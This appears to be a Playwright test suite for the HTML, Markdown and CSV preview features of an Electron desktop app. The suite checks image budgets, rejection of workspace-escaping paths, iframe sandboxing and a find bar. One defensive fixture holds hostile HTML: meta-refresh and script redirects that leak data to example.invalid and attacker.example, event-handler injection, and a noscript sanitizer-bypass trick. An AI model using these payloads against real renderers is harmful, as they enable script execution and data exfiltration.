import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { expect, test } from '@playwright/test';
import { CanopyAppDriver } from './canopyApp.mjs';
import { seedDemoWorkspaces } from './demoWorkspaces.mjs';
import { closeCanopy, launchCanopy } from './launchCanopy.mjs';

const WORKTREE_BRANCH = 'demo-main';
const HTML_FILE = 'canopy-preview-fixture.html';
const HTML_PREVIEW_TEST_ID = 'html-file-preview-frame';
const STATIC_PREVIEW_TEXT = 'Static preview ready';
const SCRIPTED_PREVIEW_TEXT = 'Script executed';

for (const [label, fileBytes, embeddedImages] of [
  ['many path aliases', 0, 64],
  ['large repeated images', 4 * 1024 * 1024, 2],
]) {
  test(`HTML preview bounds ${label} and remains searchable`, async () => {
    const userDataDir = mkdtempSync(
      path.join(os.tmpdir(), 'canopy-html-budget-'),
    );
    const seed = seedDemoWorkspaces({ userDataDir, apps: ['ts-pnpm-vite'] });
    const worktreePath = seed.workspaces[0].worktreePath;
    const png = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+aX1sAAAAASUVORK5CYII=',
      'base64',
    );
    writeFileSync(
      path.join(worktreePath, 'budget.png'),
      fileBytes
        ? Buffer.concat([png, Buffer.alloc(fileBytes - png.length)])
        : png,
    );
    writeFileSync(
      path.join(worktreePath, HTML_FILE),
      '<h1>Bounded gallery</h1>' +
        Array.from(
          { length: fileBytes ? 4 : 100 },
          (_, index) =>
            `<img id="image-${index}" src="./budget.png?alias=${index}">`,
        ).join(''),
    );
    const { electronApp } = await launchCanopy({ userDataDir });
    try {
      await electronApp.evaluate(({ ipcMain }) => {
        const handler = ipcMain._invokeHandlers.get('file:read-content');
        if (typeof handler !== 'function')
          throw new Error('Missing file reader IPC');
        globalThis.__htmlBudgetImageReads = 0;
        ipcMain.removeHandler('file:read-content');
        ipcMain.handle('file:read-content', (event, request) => {
          if (request.absolutePath?.endsWith('budget.png'))
            globalThis.__htmlBudgetImageReads += 1;
          return handler(event, request);
        });
      });
      const window = await electronApp.firstWindow();
      const app = new CanopyAppDriver(window);
      await app.waitForShell();
      await app.openMainPage();
      await app.selectWorktree(WORKTREE_BRANCH);
      await window.keyboard.press(
        process.platform === 'darwin' ? 'Meta+P' : 'Control+P',
      );
      await window.getByTestId('file-search-palette-input').fill(HTML_FILE);
      await window
        .getByTestId('file-search-palette-result')
        .filter({ hasText: HTML_FILE })
        .first()
        .click();
      await window
        .getByRole('button', {
          name: 'View preview; current view: source',
          exact: true,
        })
        .click();
      const frame = window.frameLocator(
        `[data-testid="${HTML_PREVIEW_TEST_ID}"]`,
      );
      await expect(frame.locator('#image-0')).toHaveAttribute(
        'src',
        /^data:image\/png;base64,/,
      );
      await expect
        .poll(() =>
          frame.locator('#image-0').evaluate((image) => image.naturalWidth),
        )
        .toBe(1);
      expect(
        await electronApp.evaluate(() => globalThis.__htmlBudgetImageReads),
      ).toBe(1);
      expect(
        await window
          .getByTestId(HTML_PREVIEW_TEST_ID)
          .evaluate((element) => element.srcdoc.length),
      ).toBeLessThan(17 * 1024 * 1024);
      await expect(frame.locator('img[src^="data:"]')).toHaveCount(
        embeddedImages,
      );
      await expect(
        frame.locator(`#image-${embeddedImages}`),
      ).not.toHaveAttribute('src', /^data:/);
      await frame.locator('h1').click();
      await window.keyboard.press(
        process.platform === 'darwin' ? 'Meta+F' : 'Control+F',
      );
      const drawer = window.getByTestId('surface-find-bar');
      await expect(drawer).toBeVisible();
      await drawer.locator('input').fill('Bounded');
      await expect(drawer).toContainText('1 of 1');
    } finally {
      await closeCanopy(electronApp, userDataDir);
    }
  });
}

test('HTML preview loads workspace-relative images and rejects escaping paths', async () => {
  const userDataDir = mkdtempSync(
    path.join(os.tmpdir(), 'canopy-html-images-'),
  );
  const demoSeed = seedDemoWorkspaces({ userDataDir, apps: ['ts-pnpm-vite'] });
  const worktreePath = demoSeed.workspaces[0].worktreePath;
  const png = Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+aX1sAAAAASUVORK5CYII=',
    'base64',
  );
  mkdirSync(path.join(worktreePath, 'gallery'), { recursive: true });
  writeFileSync(path.join(worktreePath, 'gallery', 'capture space.png'), png);
  writeFileSync(path.join(worktreePath, 'shared.png'), png);
  const outside = path.join(path.dirname(worktreePath), 'outside-preview.png');
  writeFileSync(outside, png);
  if (process.platform !== 'win32')
    symlinkSync(outside, path.join(worktreePath, 'gallery', 'escaped.png'));
  writeFileSync(
    path.join(worktreePath, 'gallery', HTML_FILE),
    `
    <h1>Relative image gallery</h1>
    <img id="local" src="./capture%20space.png">
    <img id="parent" src="../shared.png">
    <img id="outside" src="../../outside-preview.png">
    <img id="symlink" src="./escaped.png">
    <img id="missing" src="./missing.png">
    <script>document.body.dataset.scriptRan = 'yes'</script>
  `,
  );
  const { electronApp } = await launchCanopy({ userDataDir });
  try {
    const window = await electronApp.firstWindow();
    const app = new CanopyAppDriver(window);
    await app.waitForShell({ timeout: 30_000 });
    await app.openMainPage();
    await app.selectWorktree(WORKTREE_BRANCH);
    await window.keyboard.press(
      process.platform === 'darwin' ? 'Meta+P' : 'Control+P',
    );
    await expect(window.getByTestId('file-search-palette')).toBeVisible();
    await window.getByTestId('file-search-palette-input').fill(HTML_FILE);
    await window
      .getByTestId('file-search-palette-result')
      .filter({ hasText: HTML_FILE })
      .first()
      .click();
    await window
      .getByRole('button', {
        name: 'View preview; current view: source',
        exact: true,
      })
      .click();
    const frame = window.frameLocator(
      `[data-testid="${HTML_PREVIEW_TEST_ID}"]`,
    );
    for (const id of ['local', 'parent']) {
      await expect
        .poll(() =>
          frame.locator(`#${id}`).evaluate((image) => image.naturalWidth),
        )
        .toBe(1);
      await expect(frame.locator(`#${id}`)).toHaveAttribute(
        'src',
        /^data:image\/png;base64,/,
      );
      await expect(frame.locator(`#${id}`)).toBeVisible();
    }
    for (const id of ['outside', 'symlink', 'missing']) {
      expect(
        await frame.locator(`#${id}`).evaluate((image) => image.naturalWidth),
      ).toBe(0);
      await expect(frame.locator(`#${id}`)).not.toHaveAttribute(
        'src',
        /^data:/,
      );
    }
    expect(
      await frame
        .locator('body')
        .evaluate((body) => body.dataset.scriptRan ?? null),
    ).toBeNull();
    await expect(window.getByTestId(HTML_PREVIEW_TEST_ID)).toHaveAttribute(
      'sandbox',
      'allow-scripts',
    );
    await frame.locator('h1').click();
    await window.keyboard.press(
      process.platform === 'darwin' ? 'Meta+F' : 'Control+F',
    );
    const drawer = window.getByTestId('surface-find-bar');
    await expect(drawer).toBeVisible();
    await drawer.locator('input').fill('Relative');
    await expect(drawer).toContainText('1 of 1');
  } finally {
    await closeCanopy(electronApp, userDataDir);
  }
});

test('HTML file preview renders in a passive constrained sandbox', async () => {
  const userDataDir = mkdtempSync(
    path.join(os.tmpdir(), 'canopy-html-preview-'),
  );
  const demoSeed = seedDemoWorkspaces({
    userDataDir,
    apps: ['ts-pnpm-vite'],
  });
  const worktreePath = demoSeed.workspaces[0]?.worktreePath;
  expect(worktreePath, 'seeded worktree path').toBeTruthy();

  writeFileSync(
    path.join(worktreePath, HTML_FILE),
    [
      '<!doctype html>',
      '<html>',
      '<head>',
      '<meta http-equiv="refresh" content="0; url=https://example.invalid/leak?data=secret">',
      '</head>',
      '<body onload="document.body.dataset.scriptRan = 1">',
      '<img src="https://example.invalid/preview-image" onerror="document.body.dataset.scriptRan = 1">',
      '<iframe src="https://example.invalid/preview-frame"></iframe>',
      '<link rel="stylesheet" href="https://example.invalid/preview-style">',
      '<noscript><style></noscript><meta http-equiv="refresh" content="0;url=https://attacker.example/leak"></style></noscript>',
      '<map><area href="https://attacker.example/navigation"></map>',
      '<div><template shadowrootmode="open"><a href="https://attacker.example/shadow">Shadow link</a></template></div>',
      `<h1 id="status">${STATIC_PREVIEW_TEXT}</h1>`,
      '<script>',
      "document.body.dataset.scriptRan = 'yes';",
      `document.getElementById('status').textContent = '${SCRIPTED_PREVIEW_TEXT}';`,
      "setTimeout(() => { window.location.href = 'https://example.invalid/leak?data=secret'; }, 50);",
      '</script>',
      '</body>',
      '</html>',
    ].join('\n'),
    'utf8',
  );

  const { electronApp } = await launchCanopy({ userDataDir });

  try {
    const window = await electronApp.firstWindow();
    // Request events can include CSP-blocked resources. Route interception
    // measures attempts that actually reach the network stage.
    const externalAttempts = [];
    const externalResponses = [];
    await window.route('https://example.invalid/**', async (route) => {
      externalAttempts.push(route.request().url());
      await route.abort();
    });
    window.on('response', (response) => {
      if (response.url().includes('example.invalid'))
        externalResponses.push(response.url());
    });
    const app = new CanopyAppDriver(window);

    await app.waitForShell({ timeout: 30_000 });
    await app.openMainPage();
    await app.selectWorktree(WORKTREE_BRANCH);
    await expect(window.getByTestId('panel-content-chat')).toBeVisible();

    await window.keyboard.press(
      process.platform === 'darwin' ? 'Meta+P' : 'Control+P',
    );
    const palette = window.getByTestId('file-search-palette');
    await expect(palette).toBeVisible();
    await window.getByTestId('file-search-palette-input').fill(HTML_FILE);
    const result = window
      .getByTestId('file-search-palette-result')
      .filter({ hasText: HTML_FILE })
      .first();
    await expect(result).toBeVisible({ timeout: 15_000 });
    await result.click();

    // Exact name: substring role matching would also hit the file panel
    // tab's close button ("Close canopy-preview-fixture.html").
    const previewButton = window.getByRole('button', {
      name: 'View preview; current view: source',
      exact: true,
    });
    await expect(previewButton).toBeVisible();
    await previewButton.click();

    const frame = window.getByTestId(HTML_PREVIEW_TEST_ID);
    await expect(frame).toBeVisible();
    await expect(frame).toHaveAttribute('sandbox', 'allow-scripts');
    await expect(frame).not.toHaveAttribute('srcdoc', /attacker\.example/);

    const frameBody = window
      .frameLocator(`[data-testid="${HTML_PREVIEW_TEST_ID}"]`)
      .locator('body');
    await expect(frameBody.getByText(STATIC_PREVIEW_TEXT)).toBeVisible();
    await expect(frameBody.getByText(SCRIPTED_PREVIEW_TEXT)).toHaveCount(0);

    const scriptRan = await frameBody.evaluate(
      (body) => body.dataset.scriptRan ?? null,
    );
    expect(scriptRan).toBeNull();

    await window.waitForTimeout(250);
    const frameLocation = await frameBody.evaluate(
      (body) => body.ownerDocument.location.href,
    );
    expect(frameLocation).toContain('about:srcdoc');
    expect(frameLocation).not.toContain('example.invalid');
    expect(externalAttempts).toEqual([]);
    expect(externalResponses).toEqual([]);
    expect(
      await frameBody.evaluate(() => {
        try {
          return window.parent.document.body !== null;
        } catch {
          return false;
        }
      }),
    ).toBe(false);
  } finally {
    await closeCanopy(electronApp, userDataDir);
  }
});

for (const [extension, content] of [
  [
    'md',
    '# Preview search\n\nOrchid first.\n\n' +
      'Other content.\n\n'.repeat(60) +
      'Orchid second.',
  ],
  [
    'csv',
    'Name,Count\nOrchid first,1\n' + 'Cedar,0\n'.repeat(60) + 'Orchid second,2',
  ],
  [
    'html',
    '<h1>Preview search</h1><p>Orchid first.</p><div style="height:1500px"></div><p>Orchid second.</p>',
  ],
]) {
  test(`preview search drawer finds and navigates ${extension} text`, async () => {
    const userDataDir = mkdtempSync(path.join(os.tmpdir(), 'preview-search-'));
    const seed = seedDemoWorkspaces({ userDataDir, apps: ['ts-pnpm-vite'] });
    const filename = `preview-search.${extension}`;
    writeFileSync(
      path.join(seed.workspaces[0].worktreePath, filename),
      content,
    );
    const { electronApp } = await launchCanopy({ userDataDir });
    try {
      const window = await electronApp.firstWindow();
      const app = new CanopyAppDriver(window);
      await app.waitForShell();
      await app.openMainPage();
      await app.selectWorktree(WORKTREE_BRANCH);
      await window.keyboard.press(
        process.platform === 'darwin' ? 'Meta+P' : 'Control+P',
      );
      await window.getByTestId('file-search-palette-input').fill(filename);
      await window
        .getByTestId('file-search-palette-result')
        .filter({ hasText: filename })
        .first()
        .click();
      const viewer = window.getByTestId('file-viewer');
      const toggle = viewer.getByTestId('file-view-toggle');
      if (
        (await toggle.getAttribute('aria-label')).includes(
          'current view: source',
        )
      )
        await toggle.click();
      const body =
        extension === 'html'
          ? window
              .frameLocator('[data-testid="html-file-preview-frame"]')
              .locator('body')
          : viewer.getByText('Orchid first', { exact: false }).first();
      await expect(toggle).toHaveAttribute(
        'aria-label',
        extension === 'csv' ? /current view: table/ : /current view: preview/,
      );
      await expect
        .poll(() =>
          window.evaluate(() => {
            let handled = false;
            window.dispatchEvent(
              new CustomEvent('canopy:file-preview-search', {
                detail: {
                  operation: 'close',
                  acknowledge: () => {
                    handled = true;
                  },
                },
              }),
            );
            return handled;
          }),
        )
        .toBe(true);
      await body.click({ position: { x: 10, y: 10 } });
      await window.keyboard.press(
        process.platform === 'darwin' ? 'Meta+F' : 'Control+F',
      );
      // CAN-3048: desktop searches the file through the floating find bar.
      const drawer = window.getByTestId('surface-find-bar');
      await expect(drawer).toBeVisible();
      const input = drawer.locator('input');
      await expect(input).toHaveAttribute('placeholder', 'Search the file.');
      await expect(input).toBeFocused();
      await input.fill('orchid');
      await expect(drawer).toContainText('1 of 2');
      await window.keyboard.press(
        process.platform === 'darwin' ? 'Meta+F' : 'Control+F',
      );
      await expect(input).toBeFocused();
      expect(
        await input.evaluate(
          (element) => element.selectionEnd - element.selectionStart,
        ),
      ).toBe(6);
      const highlights = async () =>
        body.evaluate((element) => {
          const registry = element.ownerDocument.defaultView.CSS.highlights;
          return [...registry.values()].reduce(
            (count, highlight) => count + highlight.size,
            0,
          );
        });
      await expect.poll(highlights).toBe(3);
      await input.press('Enter');
      await expect(drawer).toContainText('2 of 2');
      const secondMatch =
        extension === 'html'
          ? window
              .frameLocator('[data-testid="html-file-preview-frame"]')
              .getByText('Orchid second.')
          : viewer.getByText('Orchid second', { exact: false });
      await expect(secondMatch).toBeInViewport();
      await input.press('Enter');
      await expect(drawer).toContainText('1 of 2');
      const firstMatch =
        extension === 'html'
          ? window
              .frameLocator('[data-testid="html-file-preview-frame"]')
              .getByText('Orchid first.')
          : viewer.getByText('Orchid first', { exact: false });
      await expect(firstMatch).toBeInViewport();
      await input.press('Shift+Enter');
      await expect(drawer).toContainText('2 of 2');
      await input.fill('no matching phrase');
      await expect(drawer).toContainText('0 of 0');
      await expect(
        drawer.getByRole('button', { name: 'Next match', exact: true }),
      ).toBeDisabled();
      await input.press('Escape');
      await expect(drawer).toHaveCount(0);
      await expect(viewer).toBeVisible();
      await expect.poll(highlights).toBe(0);
      await window
        .locator('[data-panel-kind="file-diff"][data-active="true"]')
        .first()
        .click();
      await window.keyboard.press(
        process.platform === 'darwin' ? 'Meta+F' : 'Control+F',
      );
      await expect(drawer).toBeVisible();
      await input.fill('orchid');
      await expect(drawer).toContainText('1 of 2');
      await drawer
        .getByRole('button', { name: 'Close search', exact: true })
        .click();
      await expect(drawer).toHaveCount(0);
      await expect.poll(highlights).toBe(0);
      if (extension === 'html') {
        const acknowledged = await window.evaluate(() => {
          let handled = false;
          window.dispatchEvent(
            new CustomEvent('canopy:file-preview-search', {
              detail: {
                operation: 'open',
                acknowledge: () => {
                  handled = true;
                },
              },
            }),
          );
          return handled;
        });
        expect(acknowledged).toBe(true);
        await expect(drawer).toBeVisible();
        await drawer.locator('input').press('Escape');
        await expect(drawer).toHaveCount(0);
        await toggle.click();
        await expect(drawer).toHaveCount(0);
        await expect(toggle).toHaveAttribute(
          'aria-label',
          /current view: source/,
        );
        // The mode switch commits before the host's search listener cleanup.
        // Wait for that cleanup without opening a drawer on an early probe.
        await expect
          .poll(() =>
            window.evaluate(() => {
              let handled = false;
              window.dispatchEvent(
                new CustomEvent('canopy:file-preview-search', {
                  detail: {
                    operation: 'close',
                    acknowledge: () => {
                      handled = true;
                    },
                  },
                }),
              );
              return handled;
            }),
          )
          .toBe(false);
        const rawAcknowledged = await window.evaluate(() => {
          let handled = false;
          window.dispatchEvent(
            new CustomEvent('canopy:file-preview-search', {
              detail: {
                operation: 'open',
                acknowledge: () => {
                  handled = true;
                },
              },
            }),
          );
          return handled;
        });
        expect(rawAcknowledged).toBe(false);
        await toggle.click();
        await expect(drawer).toHaveCount(0);
        await expect(toggle).toHaveAttribute(
          'aria-label',
          /current view: preview/,
        );
        await expect
          .poll(() =>
            window.evaluate(() => {
              let handled = false;
              window.dispatchEvent(
                new CustomEvent('canopy:file-preview-search', {
                  detail: {
                    operation: 'close',
                    acknowledge: () => {
                      handled = true;
                    },
                  },
                }),
              );
              return handled;
            }),
          )
          .toBe(true);
        await body.click({ position: { x: 10, y: 10 } });
      }
      await window.keyboard.press(
        process.platform === 'darwin' ? 'Meta+F' : 'Control+F',
      );
      await input.fill('orchid');
      await expect(drawer).toContainText('1 of 2');
      await toggle.click();
      await expect(drawer).toHaveCount(0);
    } finally {
      await closeCanopy(electronApp, userDataDir);
    }
  });
}
